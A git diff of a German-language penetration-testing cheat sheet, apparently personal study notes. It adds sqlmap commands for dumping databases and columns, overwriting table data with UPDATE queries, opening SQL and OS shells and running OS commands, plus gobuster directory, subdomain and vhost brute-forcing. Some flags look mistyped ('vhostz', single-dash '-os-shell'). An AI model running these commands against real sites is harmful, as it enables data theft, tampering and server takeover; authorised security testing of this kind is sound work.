@@ -213,44 +213,104 @@ exit
 sqlmap.py -u [POST-GET-URL] -a
 ```
 
-- Alle Daten von einer Tabelle anzeigen
+- Mit Optimierungen (Predict Output, Keep-Alive Headers, Null Connections, Max Number of threads) ausführen
 ```
-sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --dump
+sqlmap.py -u [GET-URL] --tables -o
 ```
 
-- DBs auf Website anzeigen
+- Alle Daten von einer Tabelle anzeigen
 ```
-sqlmap.py -u [POST-GET-URL] --dbs
+sqlmap.py -u [GET-URL] -D [Databasename] -T [Tablename] --dump
+```
+
+- DBs von Website anzeigen
+```
+sqlmap.py -u [GET-URL] --dbs
 ```
 
 - Schema von DB anzeigen
 ```
-sqlmap.py -u [POST-GET-URL] --schema
+sqlmap.py -u [GET-URL] --schema
 ```
 
 - Tabellen von bestimmter DB anzeigen
 ```
-sqlmap.py -u [POST-GET-URL] -D [Databasename] --tables
+sqlmap.py -u [GET-URL] -D [Databasename] --tables
 ```
 
 - Spalten von bestimmter Tabelle anzeigen
 ```
-sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] --columns
+sqlmap.py -u [GET-URL] -D [Databasename] -T [Tablename] --columns
 ```
 
 - Daten von bestimmter Spalten anzeigen
 ```
-sqlmap.py -u [POST-GET-URL] -D [Databasename] -T [Tablename] -C [Columname] --dump
+sqlmap.py -u [GET-URL] -D [Databasename] -T [Tablename] -C [Columname] --dump
 ```
 
-- Mit Zeitoptimierungen ausführen
+- Inhalt von Spalte ersetzen
 ```
-sqlmap.py -u [POST-GET-URL] --tables -o
+sqlmap.py -u [GET-URL] -T [Tablename] --sql-query='UPDATE [tablename] SET [columname]='[string]''
+```
+
+- Inhalt von Zeile ersetzen
+```
+sqlmap.py -u [GET-URL] -T [Tablename] --sql-query='UPDATE [tablename] SET [columname]='[string]' WHERE ID=[ID]'
+```
+
+- SQL-Shell aufmachen
+```
+sqlmap.py -u [GET-URL] -sql-shell
+```
+
+- OS-Shell aufmachen (Linux-Server)
+```
+sqlmap.py -u [GET-URL] -os-shell
+```
+
+OS-Command senden
+```
+sqlmap.py -u [GET-URL] -os-cmd [COMMAND]
 ```
 
 - Ohne Userinput ausführen
 ```
-sqlmap.py -u [POST-GET-URL] --tables --batch
+sqlmap.py -u [GET-URL] --tables --batch
+```
+
+- Testen von Formularen ohne User-Input
+```
+sqlmap.py -u [GET-URL] --tables --batch
+```
+
+- Testen von Seiten anhand eines Request-Files (Von Burp-Intercepter zum Beispiel)
+```
+sqlmap.py -r [PATH-TO-FILE]
+```
+
+- Daten von POST-Request mitgeben
+```
+sqlmap.py -u [GET-URL] --data="user=admin&password=password"
+```
+
+- POST-Login Seite scannen (Cookie von HTTP Header > Session-Cookie) mit zufälligem User-Agenten
+```
+sqlmap.py -u [POST-URL] --cookie=[SESSION-COOKIE] --random-agent
+```
+
+- Tiefer in Website suchen (1-5 Subdirectorys)
+```
+sqlmap.py -u [GET-URL] --crawl [1-5]
+```
+
+- Anzahl Payloads (Risk) erhöhen / Mehr komplexere Payloads
+```
+sqlmap.py -u [GET-URL] --risk [1-3]
+```
+
+- Payloads anzeigen welche gesendet werden / Verbose Level
+```
+sqlmap.py -u [GET-URL] -v [1-6]
 ```
 
 ### Beispiel
@@ -357,13 +417,24 @@ dirbuster
 dirb [URL] /usr/share/wordlists/dir/common.txt
 ```
 
-## [gobuster](https://hackertarget.com/gobuster-tutorial/)
+## [gobuster](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/)
 - Brute Force Directories von Websiten
 - Alternativer zu dirb
 
 ### Syntax
+- Subsites scannen
 ```
 gobuster dir -u [URL] -w [worldist]
+```
+
+- Subdomains scannen
+```
+gobuster dns -d [URL] -w [worldist]
+```
+
+- VHosts scannen
+```
+gobuster vhostz -u [URL] -w [worldist]
 ```
 
 ## [xsstrike](https://blog.intigriti.com/2021/06/29/hacker-tools-xsstrike-hunting-for-low-hanging-fruits/)
